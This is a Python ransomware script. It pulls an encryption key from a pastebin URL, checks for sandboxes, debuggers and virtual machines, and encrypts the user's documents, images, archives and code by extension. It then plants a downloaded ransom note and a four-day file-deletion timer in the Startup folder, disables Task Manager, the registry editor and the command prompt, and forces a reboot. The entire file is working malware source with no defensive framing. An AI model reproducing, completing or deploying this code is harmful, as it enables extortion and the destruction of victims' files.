from modules import rsa,learn_key
from modules.bypass import anti_debugger,anti_sandbox,anti_vm
from ctypes import *
import os,time,win32api,sys,wget,shutil

try:
    PUBLIC_KEY = learn_key.public_key('https://pastebin.com/raw/FrNX6xHE')
except:
    sys.exit(0)

def anti_disassembly():
    a = 'adsadssadasdsgfaad'
    ab = 'adsadssadasdsasdad'
    ac = 'adsadssadasdsgfad'
    ad = 'adsadssadasadfdsad'
    av = 'adsadssadasdsasdad'
    abx = 'adsadssadasdsagad'
    acx = 'adsadssaadsadasdsad'
    ada = 'adsadssadasdagsad'
    aas = 'adsadsfssadasdsad'
    ae = 'adsadsgsadasdsad'
    ar = 'adfdfsadssadasdsad'

def download_ransom_request():
    try:
        dir_startup = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'.format(os.getenv('username'))
        # Script that will show the ransom request
        wget.download('mediafire.com',out=dir_startup+'ransom_request.exe')
        shutil.copy(dir_startup+'rescue_request.exe','C:\\Users\\{}\\Desktop\\ransom_request.exe')
        # Script that counts the 4 days to delete all files
        wget.download('mediafire.com',out=dir_startup+'time_script.exe')
    except:
        pass

def disable_all():
    try:
        os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableRegistryTools /d 1 /f')
        os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableTaskMgr /d 1 /f')
        os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableCMD /d 1 /f')
        os.system('shutdown /r /f')
    except:
        os.system('shutdown /r /f')

def main():
    anti_disassembly()
    if anti_sandbox.check(0,0,1,0,1,1) == True:
        pass
    else:
        print 'sandbox found'
    if anti_debugger.check() == True:
        pass
    else:
        print 'debugger found'
    if anti_vm.check() == True:
        pass
    else:
        print 'debugger found'
    
    username = os.getenv('username')
    path2crypt = 'C:\\Users\\' + username
    valid_extension = [".pl",".7z",".rar",".m4a",".wma",".avi",".wmv",".d3dbsp",".sc2save",".sie",".sum",".bkp",".flv",".js",".raw",".jpeg",".tar",".zip",".tar.gz",".cmd",".key",".DOT",".docm",".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".bmp"]
    enc_files = rsa.files2crypt(path2crypt)
    for file_pnt in enc_files:
        if os.path.basename(file_pnt).endswith(".wannadie"):
            pass
        else:
            extension = os.path.splitext(file_pnt)[1]
            if extension in valid_extension:
                try:
                    rsa.encryptar(str(file_pnt), PUBLIC_KEY)
                except:
                    pass

    with open('C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\delete_ransom.bat'.format(os.getenv('username')),'w') as in_file:
        in_file.write('del /Q /S /F {}'.format(sys.argv[0]))
        in_file.close()
    download_ransom_request()
    disable_all()

main()
